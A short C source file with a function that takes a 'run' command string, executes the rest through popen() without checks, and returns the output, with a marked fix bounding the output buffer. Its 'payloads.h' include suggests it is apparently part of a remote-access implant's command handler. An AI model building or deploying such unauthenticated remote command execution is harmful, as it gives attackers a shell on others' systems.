#include "payloads.h"
int handleCommand(char *cmd, char *output_buffer)
{
    memset(output_buffer, 0, 1024);

    char *word = strtok(cmd, " ");
    if (word && strcmp(word, "run") == 0) // Safety: Check if word is NULL
    {
        char *command = strtok(NULL, "");
        if (command)
        {
            printf("Executing command: %s\n", command);
            FILE *fp = popen(command, "r");
            if (fp == NULL)
            {
                strcpy(output_buffer, "Error: Failed to run command");
                return ERROR;
            }

            // --- THE FIX START ---
            char line_buffer[256]; // Temp buffer for one line
            while (fgets(line_buffer, sizeof(line_buffer), fp) != NULL)
            {
                // Only append if we have space left
                if (strlen(output_buffer) + strlen(line_buffer) < 1023)
                {
                    strcat(output_buffer, line_buffer);
                }
            }
            // --- THE FIX END ---

            printf("%s", output_buffer); // Verify the full result
            pclose(fp);
        }
    }
    else
    {
        sprintf(output_buffer, "Unknown command: %s", word ? word : "NULL");
    }
    return TRUE;
}